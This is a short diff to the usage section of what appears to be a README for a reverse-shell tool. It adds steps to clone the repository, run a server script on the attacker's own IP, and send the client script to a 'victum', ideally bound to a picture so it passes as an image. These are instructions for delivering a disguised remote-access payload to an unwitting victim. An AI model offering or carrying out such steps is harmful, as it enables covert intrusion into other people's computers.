@@ -31,7 +31,9 @@ ________________________________________________________________________________
 
 #                           ** How we Execute this command **
 #                 git clone https://github.com/iamzeropoison/reverse_shell_ip.git
-#                              cd reverse_shell_ip                
+#                              cd reverse_shell_ip 
+#                              python3 server.py  (always put your machine ip)
+#                              python3 client.py  (send it to your victum its good if you bind with any pic)
 ________________________________________________________________________________________
 # Important Notes
 Usage Warning:
